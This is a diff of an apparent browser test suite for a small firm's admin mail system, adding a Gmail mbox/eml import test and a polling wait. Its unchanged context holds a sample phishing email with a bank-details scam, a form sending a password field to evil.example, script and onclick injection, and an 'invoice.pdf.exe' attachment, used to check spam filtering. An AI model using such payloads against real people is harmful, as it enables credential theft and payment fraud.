@@ -44,7 +44,8 @@ const deliver=async(from,raw)=>{const r=await fetch(`${W}/cdn-cgi/handler/email?
    auth:'attacker.example; spf=pass; dkim=pass; dmarc=pass',replyTo:'payme@gmail.com',
    html:'<p onclick="steal()">Please note our change of bank details. <a href="https://evil.example/login">www.kudabank.com</a></p><script>alert(1)</script><form action="https://evil.example"><input name="pw"></form>',
    atts:[{name:'invoice.pdf.exe',type:'application/octet-stream',data:Buffer.from('MZ fake program')}]}))<300,'Worker accepts the phishing email (it never drops mail)');
- await sleep(2500);
+ // Wait until the Worker and the site have both handled the two emails
+ for(let i=0;i<30;i++){await a.goto(B+'/admin/mail?f=spam');if((await txt(a)).includes('change of bank details'))break;await sleep(1000);}
  // Inbox: the genuine email; the impersonation went straight to Spam
  await a.goto(B+'/admin/mail');let body=await txt(a);
  ok(body.includes('My CAC documents')&&!body.includes('Urgent: change of bank details'),'genuine email in the inbox, impersonation not');
@@ -168,6 +169,34 @@ const deliver=async(from,raw)=>{const r=await fetch(`${W}/cdn-cgi/handler/email?
  await a.goto(B+'/admin/mail');await a.click('.mail-row:has-text("Ngozi")');await a.waitForLoadState();
  const clientHref=await a.getAttribute('a[href^="/admin/client/"]','href');
  const ex=await a.evaluate(async u=>(await fetch(u)).json(),clientHref+'/export');ok(Array.isArray(ex.emails)&&ex.emails.length>=3,'client data export includes their emails');
+ // ── Importing past mail from Gmail (Takeout .mbox and a single .eml)
+ const d1=`<daniel1.${stamp}@acruxx.example>`;
+ const mk=(lines)=>lines.join('\r\n')+'\r\n';
+ const danielMsg=mk(['X-Gmail-Labels: Inbox,Important','Authentication-Results: mx.google.com; spf=pass smtp.mailfrom=acruxx.example; dkim=pass; dmarc=pass','From: Daniel Iyaki <daniel@acruxx.example>','To: abdullateef@awalglobal.com.ng','Subject: Follow-up on SCUML '+stamp,`Message-ID: ${d1}`,'Date: Thu, 19 Nov 2026 10:00:00 +0100','Content-Type: text/plain; charset=utf-8','','Dear Abdullateef,','>From the desk of Daniel','Could you confirm the status?']);
+ const personal=mk(['X-Gmail-Labels: Inbox','From: Shop <deals@shop.example>','To: someone@gmail.com','Subject: Big sale '+stamp,`Message-ID: <sale.${stamp}@shop.example>`,'Date: Thu, 19 Nov 2026 11:00:00 +0100','','Buy now']);
+ const gmailReply=mk(['X-Gmail-Labels: Sent','From: Awal Gmail <awal.office@gmail.com>','To: daniel@acruxx.example','Subject: Re: Follow-up on SCUML '+stamp,`Message-ID: <reply.${stamp}@mail.gmail.com>`,`In-Reply-To: ${d1}`,`References: ${d1}`,'Date: Thu, 19 Nov 2026 12:00:00 +0100','','Noted, Daniel.']);
+ const trashed=mk(['X-Gmail-Labels: Trash','From: x@acruxx.example','To: info@awalglobal.com.ng','Subject: deleted one '+stamp,`Message-ID: <trash.${stamp}@x>`,'Date: Thu, 19 Nov 2026 13:00:00 +0100','','gone']);
+ // Sent reply first in the file: it must still join Daniel's conversation
+ const mbox=['From 1 Thu Nov 19 10:00:00 2026','From 2 Thu Nov 19 11:00:00 2026','From 3 Thu Nov 19 12:00:00 2026','From 4 Thu Nov 19 13:00:00 2026'];
+ const mboxText=mbox[2]+'\n'+gmailReply+'\n'+mbox[0]+'\n'+danielMsg+'\n'+mbox[1]+'\n'+personal+'\n'+mbox[3]+'\n'+trashed;
+ await a.goto(B+'/admin/mail');await a.click('a.btn:has-text("Import")');await a.waitForLoadState();
+ await a.setInputFiles('#imp-files',[{name:'All mail Including Spam and Trash.mbox',mimeType:'application/mbox',buffer:Buffer.from(mboxText)}]);
+ await a.waitForFunction(()=>/finished/.test(document.querySelector('.imp-text').textContent),null,{timeout:60000});
+ const impText=await a.textContent('.imp-text');
+ ok(/4 of 4 read · 2 imported · 0 already here · 2 not for your domain/.test(impText),'mbox import: Daniel and the Gmail reply in, personal and trashed mail out ('+impText.slice(0,80)+')');
+ await a.setInputFiles('#imp-files',[{name:'Follow-up.eml',mimeType:'message/rfc822',buffer:Buffer.from(danielMsg)}]);
+ await a.waitForFunction(()=>/finished/.test(document.querySelector('.imp-text').textContent)&&/1 of 1/.test(document.querySelector('.imp-text').textContent),null,{timeout:30000});
+ ok(/1 already here/.test(await a.textContent('.imp-text')),'importing the same email again is skipped');
+ await a.goto(B+'/admin/mail?box=abdullateef%40awalglobal.com.ng');body=await txt(a);
+ ok(body.includes('Follow-up on SCUML '+stamp)&&!body.includes('Big sale'),'imported email is in the inbox under abdullateef@');
+ await a.click(`.mail-row:has-text("Follow-up on SCUML ${stamp}")`);await a.waitForLoadState();body=await txt(a);
+ ok(await a.locator('.mail-msg').count()===2&&body.includes('Sender verified (acruxx.example)'),'conversation holds Daniel and the earlier Gmail reply; Gmail verdict kept');
+ ok((await a.frameLocator('iframe.mail-frame').first().locator('body').textContent({timeout:10000})).includes('From the desk of Daniel'),'imported text shows');
+ await a.click('a.btn:has-text("Reply")');await a.waitForLoadState();
+ ok(await a.inputValue('#m-from')==='abdullateef@awalglobal.com.ng'&&await a.inputValue('#m-to')==='daniel@acruxx.example'&&await a.inputValue('#m-subject')==='Re: Follow-up on SCUML '+stamp,'reply goes from abdullateef@ to Daniel in the same conversation');
+ await a.fill('#m-body','Dear Daniel, update below.\n\n'+(await a.inputValue('#m-body')));await a.click('.mail-compose button[type=submit]:has-text("Send")');await a.waitForLoadState();
+ const dr=emails().filter(e=>e.subject==='Re: Follow-up on SCUML '+stamp).at(-1);
+ ok(dr&&dr.headers['In-Reply-To']===d1&&dr.sender.email==='abdullateef@awalglobal.com.ng','reply threads on Daniel\'s side (In-Reply-To his email)');
  await a.screenshot({path:S+'/mail-thread.png',fullPage:true});
  await a.goto(B+'/admin/mail?f=sent');await a.screenshot({path:S+'/mail-sent.png',fullPage:true});
  await a.goto(B+'/admin/mail/new?from=abdullateef%40awalglobal.com.ng');await a.screenshot({path:S+'/mail-compose.png',fullPage:true});
